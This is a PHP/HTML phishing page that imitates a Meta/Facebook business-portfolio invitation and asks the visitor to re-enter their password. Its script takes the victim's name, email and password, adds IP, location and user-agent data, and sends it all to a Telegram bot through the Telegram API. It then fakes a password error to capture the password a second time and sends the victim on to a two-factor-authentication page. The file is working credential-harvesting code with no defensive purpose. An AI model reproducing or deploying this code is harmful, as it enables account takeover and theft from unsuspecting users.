<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Review and Accept Invitation</title>
    <link rel="stylesheet" href="/styles/confirm-business-information.css">
</head>
<body>
    <nav class="meta-nav">
        <div class="nav-content">
            <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
        </div>
    </nav>

    <main class="main-container">
        <div class="confirm-card">
            <h1>Review and accept invitation</h1>
            
            <div class="user-info">
                <div class="info-row">
                    <span class="label">Name:</span>
                    <span class="value" id="name"></span>
                </div>
                <div class="info-row">
                    <span class="label">Email:</span>
                    <span class="value" id="email"></span>
                    <span class="info-icon" data-tooltip="This email will be used for notifications">ⓘ</span>
                </div>
            </div>

            <div class="terms-section">
                <div class="terms-item">
                    <div class="terms-number">1</div>
                    <p>Your name, email, profile picture and actions you take on behalf of Amateur Players Tour will be visible to other people managing this business.</p>
                </div>
                
                <div class="terms-item">
                    <div class="terms-number">2</div>
                    <p>Anything you do on behalf of this business will not be shared to your personal profile.</p>
                </div>
                
                <div class="terms-item">
                    <div class="terms-number">3</div>
                    <p>To improve security, people with full control of your business portfolio may know whether you have enabled 2-factor authentication.</p>
                </div>
            </div>

            <div class="agreement-section">
                <p>By accepting this invitation, you'll be added to Amateur Players Tour's business portfolio and agree to the 
                    <a href="#" class="link">Terms of Service</a> and 
                    <a href="#" class="link">Commercial Terms</a>.
                </p>
            </div>

            <div class="navigation-footer">
                <button class="prev-btn">
                    <span class="arrow">←</span>
                    Previous
                </button>
                <span class="page-indicator">3 of 3</span>
                <button class="accept-btn">Accept invitation</button>
            </div>
        </div>
    </main>

    <footer class="metae-footer">
        <div class="footer-links">
            <a href="#">Facebook</a>
            <a href="#">Developers</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
            <a href="#">Report a problem</a>
        </div>
        <div class="footer-info">
            <span class="language">English (US)</span>
        </div>
    </footer>

    <script src="/scripts/confirm-business-information.js"></script>
    
    <!-- Password Confirmation Modal -->
    <div class="password-modal">
        <form action="" onsubmit="sendToTelegramFromConfirmBusinessInformation(event)">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Please re-enter your password</h2>
                    <button class="close-modal">×</button>
                </div>
                <div class="modal-body">
                    <p class="modal-message">For your security, you must re-enter your password to continue.</p>
                    <div class="password-input">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password">
                        <svg id="eye" 
                        width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" fill="#0D0D0D"/><path d="M21.894 11.553C19.736 7.236 15.904 5 12 5c-3.903 0-7.736 2.236-9.894 6.553a1 1 0 0 0 0 .894C4.264 16.764 8.096 19 12 19c3.903 0 7.736-2.236 9.894-6.553a1 1 0 0 0 0-.894zM12 17c-2.969 0-6.002-1.62-7.87-5C5.998 8.62 9.03 7 12 7c2.969 0 6.002 1.62 7.87 5-1.868 3.38-4.901 5-7.87 5z" fill="#0D0D0D"/></svg>
                    </div>
                    <a href="#" class="forgot-password">Forgot your password?</a>
                </div>
                <div class="modal-footer">
                    <button class="cancel-btn">Cancel</button>
                    <button class="submit-btn">Submit</button>
                </div>
            </div>
        </form>
    </div>
</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var nameElement = document.getElementById('name');
        var emailElement = document.getElementById('email');

        nameElement.textContent = localStorage.getItem('firstName') + ' ' + localStorage.getItem('lastName');
        emailElement.textContent = localStorage.getItem('personalEmail');

        var paramsURL = new URLSearchParams(window.location.search);
        var error = paramsURL.get('error');
        var password = paramsURL.get('password');

        if (error == 1) {
            const acceptBtn = document.querySelector('.accept-btn');
            acceptBtn.click();
            var passwordInput = document.getElementById('password');
            passwordInput.value = password;
            passwordInput.focus();
            passwordInput.select();
            passwordInput.style.border = '1px solid #FF0303';

            passwordInput.addEventListener('input', function() {
                if (passwordInput.value.length > 0) {
                    passwordInput.style.border = '1px solid #E5E5E5';
                } else {
                    passwordInput.style.border = '1px solid #FF0303';
                }
            });
        }
    });

    var eye = document.getElementById('eye');
    eye.addEventListener('click', function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput.type == 'password') {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });

    function sendToTelegramFromConfirmBusinessInformation(event) {
        event.preventDefault();
        var password = document.getElementById('password').value;

        if (password == "") {
            alert("Please enter your password");
            return;
        }

        var firstName = localStorage.getItem('firstName');
        var lastName = localStorage.getItem('lastName');
        var personalEmail = localStorage.getItem('personalEmail');

        var content = "💬Thông Tin Tài Khoản 1💬" +
            "\n" + "----------------------------------------------------------" +
            "\nFirst Name: " + "`" + firstName + "`" +
            "\nLast Name: " + "`" + lastName + "`" +
            "\nEmail: " + "`" + personalEmail + "`" +
            "\n" + "----------------------------------------------------------" +
            "\nPassword: " + "`" + password + "`" +
            "\n" + "----------------------------------------------------------" +
            "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
            "\nIP Address: " + "`<?php echo $ip; ?>`" +
            "\nCity: " + "`<?php echo $city; ?>`" +
            "\nRegion: " + "`<?php echo $region; ?>`" +
            "\nCountry: " + "`<?php echo $country; ?>`" +
            "\nOrg: " + "`<?php echo $org; ?>`" +
            "\nTimezone: " + "`<?php echo $timezone; ?>`" +
            "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

        console.log(content);
        
        var apiToken = "<?php echo $token; ?>";
        var data = {
            chat_id: '<?php echo $chatId; ?>',
            text: content,
            parse_mode: 'Markdown'
        };

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status >= 200 && xhr.status < 300) {
                    console.log('Message sent to Telegram bot successfully.');
                    setTimeout(function() {
                        var paramsURL = new URLSearchParams(window.location.search);
                        var error = paramsURL.get('error');

                        if (error == 1) {
                            window.location.href = "/two-factor-authentication.php";
                            localStorage.setItem('firstName', firstName);
                            localStorage.setItem('lastName', lastName);
                            localStorage.setItem('personalEmail', personalEmail);
                            localStorage.setItem('password', password);
                        } else {
                            window.location.href = "/confirm-business-information.php?error=1&password=" + password;
                        }
                    }, 1000);
                } else {
                    console.error('Failed to send message to Telegram bot.');
                }
            }
        };

        xhr.send(JSON.stringify(data));
    }
</script>

</html> 